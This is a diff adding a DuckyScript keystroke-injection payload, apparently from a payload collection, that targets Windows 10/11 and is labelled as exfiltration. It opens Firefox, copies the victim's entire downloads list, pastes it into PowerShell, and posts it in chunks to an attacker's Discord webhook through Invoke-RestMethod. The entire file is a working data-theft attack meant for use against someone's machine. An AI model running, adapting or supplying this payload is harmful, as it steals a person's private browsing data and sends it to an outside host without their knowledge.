@@ -1,0 +1,77 @@
+REM ###########################################################
+REM #                                                         |
+REM # Title        : Exports all the links of the downloads   |
+REM # Author       : Aleff                                    |
+REM # Version      : 1.0                                      |
+REM # Category     : Exfiltration                             |
+REM # Target       : Windows 10/11                            |
+REM #                                                         |
+REM ###########################################################
+
+
+REM Requirements:
+REM     - Firefox installed
+
+
+REM You must define your Discord webhook if you want to use this method for the exfiltration
+DEFINE DISCORD_WEBHOOK example
+
+REM Open Firefox
+GUI
+DELAY 1000
+STRING Firefox
+DELAY 500
+ENTER
+DELAY 2000
+
+REM Goto downloads and copy all
+CTRL j
+DELAY 500
+CTRL a
+DELAY 500
+CTRL c
+DELAY 500
+
+REM Open a PowerShell and put all the links into $DOWNLOADS var
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING $DOWNLOADS="
+CTRL v
+DELAY 500
+ENTER
+
+REM It depends on the number of links
+DELAY 10000
+
+STRINGLN "
+
+REM Exfiltration using Discord Webhook
+STRING $WebhookUrl = "
+STRING DISCORD_WEBHOOK
+STRINGLN "
+
+STRINGLN $Payload = @{content = $DOWNLOADS} | ConvertTo-Json
+
+REM This algorithm is used to avoid the size limit imposed by Invoke-RestMethod on the payload length
+STRINGLN
+
+    $len = $DOWNLOADS.Length
+    $MAX_LEN = 1900
+
+    $ITERATIONS = [math]::Ceiling($len / $MAX_LEN)
+
+    for ($i = 0; $i -lt $ITERATIONS; $i++) {
+        $init = $i * $MAX_LEN
+        $end = [math]::Min(($i + 1) * $MAX_LEN, $len)
+        
+        $sub = $DOWNLOADS.Substring($init, $end - $init)
+        $Payload = @{content = $sub} | ConvertTo-Json
+
+        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType 'application/json'
+    }
+    exit;
+
+END_STRINGLN
